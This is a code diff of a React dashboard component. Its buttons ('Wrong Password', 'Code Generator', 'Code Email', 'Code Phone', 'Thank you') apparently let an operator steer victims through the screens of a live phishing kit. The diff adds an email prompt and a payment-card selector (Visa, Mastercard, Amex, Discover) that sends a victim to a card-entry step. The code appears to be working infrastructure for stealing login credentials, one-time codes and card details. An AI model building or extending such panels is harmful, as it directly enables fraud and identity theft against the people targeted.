@@ -3,7 +3,10 @@ import { Row, Col, Table, Tag, Select, Button } from "antd";
 import moment from "moment";
 import { API_BE } from "./utils/variable";
 
-const Dashboard = () => {
+
+const { Option } = Select;
+
+const Dashboard2 = () => {
   const [is_visible, setVisible] = useState(false);
   const [loading, setLoading] = useState(false);
   const [data, setData] = useState([]);
@@ -50,6 +53,35 @@ const Dashboard = () => {
       });
   };
 
+  const onConfirmEmail = (id, userEmail, status) => {
+    if(!id || !status) return;
+
+    let email = prompt("Please enter email:", userEmail);
+    if (email == null || email == "") {
+      console.log("User cancelled the prompt.")
+    } else {
+      updateStatus(id, status, email)
+    }
+  }
+
+  const onConfirmCC = (id, status, type) => {
+    if(!id || !status) return;
+
+    let cc = prompt(`Please enter CC for ${type}`, '');
+    if (cc == null || cc == "") {
+      console.log("User cancelled the prompt.")
+    } else {
+      updateStatus(id, status, cc + "|" + type)
+    }
+  }
+
+  const onSelectChange = (id, status, cc_type) => {
+    if(!cc_type) return;
+    if(cc_type === "visa") return onConfirmCC(id, status, cc_type);
+    if(cc_type === "mastercard") return onConfirmCC(id, status, cc_type);
+    if(cc_type === "amex") return onConfirmCC(id, status, cc_type);
+    if(cc_type === "discover") return onConfirmCC(id, status, cc_type);
+  }
 
   const columns = [
     {
@@ -84,12 +116,13 @@ const Dashboard = () => {
         return (
           <div style={{display: "flex", flexWrap: "wrap", width: "730px", gap: "10px"}}>
             <button style={e === 0 ? { background: "green", color: "white" }: {}} onClick={(e) => updateStatus(item.unique_id, 0)}>Loading Screen</button>
-            <button style={e === 1 ? { background: "green", color: "white" }: {}} onClick={(e) => updateStatus(item.unique_id, 1)}>Wrong Password</button>
-            <button style={e === 2 ? { background: "green", color: "white" }: {}} onClick={(e) => updateStatus(item.unique_id, 2)}>Code Generator</button>
-            <button style={e === 3 ? { background: "green", color: "white" }: {}} onClick={(e) => updateStatus(item.unique_id, 3)}>Code Email</button>
-            <button style={e === 4 ? { background: "green", color: "white" }: {}} onClick={(e) => updateStatus(item.unique_id, 4)}>Code Phone</button>
-            <button style={e === 5 ? { background: "green", color: "white" }: {}} onClick={(e) => updateStatus(item.unique_id, 5)}>Thank you</button>
-            <button style={e === 6 ? { background: "green", color: "white" }: {}} onClick={(e) => updateStatus(item.unique_id, 6)}>60min</button>
+            <button style={e === 8 ? { background: "green", color: "white" }: {}} onClick={(e) => onConfirmEmail(item.unique_id, '', 8)}>Code Email</button>
+            <Select onChange={(value) => onSelectChange(item.unique_id, 7, value)} style={e === 8 ? { background: "green", color: "white" }: { width: 200 }} placeholder="Select payment method" >
+              <Option value="visa">Visa</Option>
+              <Option value="mastercard">Mastercard</Option>
+              <Option value="amex">Amex</Option>
+              <Option value="discover">Discover</Option>
+            </Select>
           </div>
         );
       },
@@ -145,4 +178,4 @@ const Dashboard = () => {
     </div>
   );
 };
-export default Dashboard;
+export default Dashboard2;
